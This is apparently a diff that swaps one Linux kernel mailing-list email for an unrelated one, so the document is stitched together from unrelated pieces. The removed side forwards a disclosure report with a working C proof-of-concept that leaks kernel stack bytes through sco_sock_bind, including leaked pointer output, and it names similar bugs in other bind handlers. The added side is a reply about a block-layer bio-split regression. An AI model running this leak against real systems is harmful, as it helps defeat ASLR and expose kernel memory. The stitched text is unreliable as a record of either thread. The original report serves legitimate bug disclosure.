@@ -1,110 +1,50 @@
-Return-Path: <ubraun@linux.vnet.ibm.com>
-Message-ID: <1452846301.3416.5.camel@BR9GV9YG.de.ibm.com>
-Subject: [Fwd: Fw: Information leak in sco_sock_bind]
-From: Ursula Braun <ubraun@linux.vnet.ibm.com>
-Date: Fri, 15 Jan 2016 09:25:01 +0100
-Content-Type: text/plain; charset="UTF-8"
-Mime-Version: 1.0
-List-Archive: <https://lore.kernel.org/linux-bluetooth/>
-List-Post: <mailto:linux-bluetooth@vger.kernel.org>
-To: Dmitry Vyukov <dvyukov@google.com>
-Cc: Marcel Holtmann <marcel@holtmann.org>, Gustavo Padovan <gustavo@padovan.org>, Johan Hedberg <johan.hedberg@gmail.com>, "David S.
- Miller" <davem@davemloft.net>, linux-bluetooth@vger.kernel.org, netdev <netdev@vger.kernel.org>, LKML <linux-kernel@vger.kernel.org>, syzkaller <syzkaller@googlegroups.com>, Kostya Serebryany <kcc@google.com>, Alexander Potapenko <glider@google.com>, Sasha Levin <sasha.levin@oracle.com>, Eric Dumazet <edumazet@google.com>, Kees Cook <keescook@google.com>, Hannes Frederic Sowa <hannes@stressinduktion.org>, "Ursula Braun1/Germany/IBM"@de.ibm.com, linux-s390@vger.kernel.org, Lauro Ramos Venancio <lauro.venancio@openbossa.org>, Aloisio Almeida Jr <aloisio.almeida@openbossa.org>, Samuel Ortiz <sameo@linux.intel.com>
+Return-Path: <linux-kernel-owner@vger.kernel.org>
+MIME-Version: 1.0
+In-Reply-To: <CA+55aFzRWzc9YECcAf0OhQ2KJzsrbEuQCA2m=_RVO22++XDVBA@mail.gmail.com>
+References: <56A0F1CA.4010303@linux.vnet.ibm.com>
+	<56A14EE4.1020008@fb.com>
+	<20160121225127.GA30993@localhost.localdomain>
+	<CA+55aFxbYLEj=aQtEu3X92m44dbREssAQeSG8ZfoLT_WL5_fkQ@mail.gmail.com>
+	<20160122032135.GA9244@localhost.localdomain>
+	<CA+55aFwGRQb_2SUTj8A9MzTC4WCVC37p64t5obUfTvLNyctjKA@mail.gmail.com>
+	<20160122230605.22859608@tom-T450>
+	<CA+55aFzRWzc9YECcAf0OhQ2KJzsrbEuQCA2m=_RVO22++XDVBA@mail.gmail.com>
+Date: Sat, 23 Jan 2016 01:48:05 +0800
+Message-ID: <CACVXFVOjqWqVyO-KbZ1TcWOBSwT=nG4onSuQHW7BOwKKjWGnKQ@mail.gmail.com>
+Subject: Re: [BUG] Regression introduced with "block: split bios to max
+ possible length"
+From: Ming Lei <tom.leiming@gmail.com>
+Content-Type: text/plain; charset=UTF-8
+Sender: linux-kernel-owner@vger.kernel.org
+List-Archive: <https://lore.kernel.org/lkml/>
+List-Post: <mailto:linux-kernel@vger.kernel.org>
+To: Linus Torvalds <torvalds@linux-foundation.org>
+Cc: Keith Busch <keith.busch@intel.com>, Jens Axboe <axboe@fb.com>, Stefan Haberland <sth@linux.vnet.ibm.com>, Linux Kernel Mailing List <linux-kernel@vger.kernel.org>, linux-s390 <linux-s390@vger.kernel.org>, Sebastian Ott <sebott@linux.vnet.ibm.com>
 List-ID: <linux-s390.vger.kernel.org>
 
-Hi Dmitry,
+On Sat, Jan 23, 2016 at 1:03 AM, Linus Torvalds
+<torvalds@linux-foundation.org> wrote:
+> On Fri, Jan 22, 2016 at 7:06 AM, Ming Lei <tom.leiming@gmail.com> wrote:
+>>
+>> Yes, it is one problem, something like below does fix my test
+>> with 4K block size.
+>
+> It just doesn't look very legible.
 
-thx for mentioning iucv_sock_bind here. I will provide the equivalent
-fix and add your name as "Reported-by" - if you do not object.
+OK, I will try to make it better.
 
-Regards, Ursula Braun
+>
+> Also, how could this
+>
+>> -                       goto split;
+>> +                       if (sectors)
+>> +                               goto split;
+>
+> ever matter? If sectors is 0, something is seriously wrong afaik.
 
------ Forwarded by Ursula Braun1/Germany/IBM on 15/01/2016 09:18 -----
+I guess that is possible because blk_max_size_offset() depends on
+offset and may return a small size which is less than logical
+block size.
 
-From:        Dmitry Vyukov <dvyukov@google.com>
-To:        Marcel Holtmann <marcel@holtmann.org>, Gustavo Padovan
-<gustavo@padovan.org>, Johan Hedberg <johan.hedberg@gmail.com>, "David
-S. Miller" <davem@davemloft.net>, linux-bluetooth@vger.kernel.org,
-netdev <netdev@vger.kernel.org>, LKML <linux-kernel@vger.kernel.org>,
-syzkaller <syzkaller@googlegroups.com>, Kostya Serebryany
-<kcc@google.com>, Alexander Potapenko <glider@google.com>, Sasha Levin
-<sasha.levin@oracle.com>, Eric Dumazet <edumazet@google.com>, Kees Cook
-<keescook@google.com>, Hannes Frederic Sowa
-<hannes@stressinduktion.org>, Ursula Braun1/Germany/IBM@IBMDE,
-linux-s390@vger.kernel.org, Lauro Ramos Venancio
-<lauro.venancio@openbossa.org>, Aloisio Almeida Jr
-<aloisio.almeida@openbossa.org>, Samuel Ortiz <sameo@linux.intel.com>, 
-Date:        15/12/2015 21:02
-Subject:        Information leak in sco_sock_bind
-
-Hello,
-
-The following program leads to leak of 6 bytes from kernel stack:
-
-#include <sys/types.h>
-#include <sys/socket.h>
-#include <linux/in.h>
-#include <linux/in6.h>
-#include <linux/socket.h>
-#include <linux/if.h>
-#include <errno.h>
-#include <stdio.h>
-#include <string.h>
-#include <unistd.h>
-#include <sys/stat.h>
-#include <fcntl.h>
-
-struct sockaddr_sco {
-sa_family_t     sco_family;
-char        sco_bdaddr[6];
-};
-
-#define BTPROTO_SCO 2
-
-int main(void)
-{
-       struct sockaddr sa;
-       struct sockaddr_sco sco_sa;
-       unsigned len, i, try;
-       int fd;
-
-       for (try = 0; try < 3; try++) {
-               fd = socket(AF_BLUETOOTH, SOCK_SEQPACKET, BTPROTO_SCO);
-               if (fd == -1)
-                       return;
-               switch (try) {
-               case 0:
-               break;
-               case 1:
-               sched_yield();
-               break;
-               case 2:
-               open("/dev/null", O_RDONLY);
-               }
-               memset(&sco_sa, 0, sizeof(sco_sa));
-               sco_sa.sco_family = AF_BLUETOOTH;
-               bind(fd, &sco_sa, 2);
-               len = sizeof(sa);
-               getsockname(fd, &sa, &len);
-               for (i = 0; i < len; i++)
-                       printf("%02x", ((unsigned char*)&sa)[i]);
-               printf("\n");
-       }
-       return 0;
-}
-
-Output:
-1f00333e0088ffff
-1f00c13e0088ffff
-1f002081ffffffff
-
-The problem is that sco_sock_bind does not check sockaddr_len passed
-in, so it copies stack garbage from stack into the socket. This can
-defeat ASLR, leak crypto keys, etc.
-We've just fixed a similar issue in pptp_bind. The similar issue is in
-llcp_sock_bind and llcp_raw_sock_bind. And there seems to be the same
-bug in iucv_sock_bind, it is S390 specific, so I can't test it.
-
-Kees proposed to zero unused part of sockaddr in SyS_bind/SyS_connect,
-or add addr size to proto struct to prevent all such existing and
-future bugs.
+--
+Ming Lei
